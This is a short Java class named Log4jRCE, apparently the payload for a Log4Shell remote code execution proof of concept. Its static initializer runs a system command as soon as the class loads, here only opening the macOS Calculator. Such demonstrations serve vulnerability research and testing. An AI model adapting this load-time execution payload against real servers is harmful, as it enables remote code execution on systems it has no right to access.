public class Log4jRCE {
    static{
        try{
            String[] cmd={"open","/System/Applications/Calculator.app"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
